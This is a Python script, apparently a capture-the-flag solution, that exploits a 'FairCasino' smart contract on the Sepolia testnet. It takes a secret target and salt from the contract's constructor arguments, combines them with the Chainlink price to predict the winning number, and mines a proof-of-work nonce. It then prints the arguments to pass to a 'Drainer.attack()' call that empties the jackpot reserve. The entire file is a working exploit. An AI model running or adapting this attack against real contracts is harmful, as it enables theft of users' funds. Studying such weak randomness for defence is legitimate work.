#!/usr/bin/env python3
"""
mine.py — Off-chain helper for the FairCasino exploit.

What it does:
  1. Reads the FairCasino current round + the Chainlink BTC/USD price.
  2. Computes the winning guess:
       guess = keccak256(packed(secretTarget XOR price, gameSalt, currentRound))
  3. Mines a nonce so that the last 2 bytes of:
       keccak256(packed(drainerAddress, nonce, guess, round))
     equal 0xbeef (FairCasino's proof-of-work requirement).
  4. Prints the (guess, round, nonce) triplet to copy-paste into Etherscan
     when calling Drainer.attack(...).

Usage:
    pip install web3 eth_abi
    python3 mine.py 0xYOUR_DRAINER_ADDRESS

If you don't pass the drainer address, the script will prompt for it.
"""

import sys
import time

try:
    from web3 import Web3
    from eth_abi.packed import encode_packed
except ImportError:
    print("[!] Missing dependencies. Run:\n    pip install web3 eth_abi")
    sys.exit(1)

# ─── Constants extracted from the FairCasino verified source + constructor args ──
TARGET = Web3.to_checksum_address("0xed5415679D46415f6f9a82677F8F4E9ed9D1302b")
ORACLE = Web3.to_checksum_address("0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43")

# constructor args, decoded from Etherscan
SECRET_TARGET = 0x14ca66724587aafc3454b268c296bc483d17df  # _target
GAME_SALT     = 7192271                                    # _salt (= 0x6dbecf)

RPC = "https://ethereum-sepolia-rpc.publicnode.com"

TARGET_ABI = [{
    "name": "currentRound", "type": "function", "stateMutability": "view",
    "inputs": [], "outputs": [{"type": "uint256"}],
}, {
    "name": "jackpotReserve", "type": "function", "stateMutability": "view",
    "inputs": [], "outputs": [{"type": "uint256"}],
}]
ORACLE_ABI = [{
    "name": "latestRoundData", "type": "function", "stateMutability": "view",
    "inputs": [],
    "outputs": [
        {"type": "uint80"}, {"type": "int256"}, {"type": "uint256"},
        {"type": "uint256"}, {"type": "uint80"},
    ],
}]


def main():
    if len(sys.argv) >= 2:
        drainer = sys.argv[1]
    else:
        drainer = input("Drainer address (0x...): ").strip()
    drainer = Web3.to_checksum_address(drainer)

    w3 = Web3(Web3.HTTPProvider(RPC))
    if not w3.is_connected():
        print("[!] Cannot reach the Sepolia RPC. Check your network or change RPC URL.")
        sys.exit(1)

    target = w3.eth.contract(address=TARGET, abi=TARGET_ABI)
    oracle = w3.eth.contract(address=ORACLE, abi=ORACLE_ABI)

    current_round = target.functions.currentRound().call()
    jackpot       = target.functions.jackpotReserve().call()
    _, price, _, _, _ = oracle.functions.latestRoundData().call()

    print(f"[i] Drainer addr  : {drainer}")
    print(f"[i] currentRound  : {current_round}")
    print(f"[i] jackpotReserve: {jackpot} wei ({Web3.from_wei(jackpot, 'ether')} ETH)")
    print(f"[i] price (BTC/USD): {price}  ({price/1e8:.2f} USD)")

    # FairCasino computes:
    #   winningNumber = uint256(keccak256(abi.encodePacked(
    #       secretTarget ^ uint256(price),  // uint256
    #       gameSalt,                       // uint256
    #       currentRound                    // uint256
    #   )))
    xor = (SECRET_TARGET ^ price) & ((1 << 256) - 1)
    guess_bytes = Web3.keccak(
        encode_packed(["uint256", "uint256", "uint256"],
                      [xor, GAME_SALT, current_round])
    )
    guess = int.from_bytes(guess_bytes, "big")
    print(f"[+] Computed guess: {guess}")
    print(f"               hex: 0x{guess:064x}")

    # Mine the nonce
    print(f"[*] Mining nonce for sig == 0xbeef ...")
    t0 = time.time()
    nonce = 0
    while True:
        h = Web3.keccak(
            encode_packed(["address", "uint256", "uint256", "uint256"],
                          [drainer, nonce, guess, current_round])
        )
        sig = (h[30] << 8) | h[31]
        if sig == 0xbeef:
            break
        nonce += 1
    dt = time.time() - t0
    print(f"[+] Found nonce: {nonce}  (after {nonce} tries, {dt:.2f}s)")

    print()
    print("─" * 60)
    print(" PASTE THESE INTO Drainer.attack() ON ETHERSCAN/REMIX:")
    print(f"   _guess : {guess}")
    print(f"   _round : {current_round}")
    print(f"   _nonce : {nonce}")
    print(f"   value  : 10000000000000000  (= 0.01 ETH)")
    print("─" * 60)


if __name__ == "__main__":
    main()
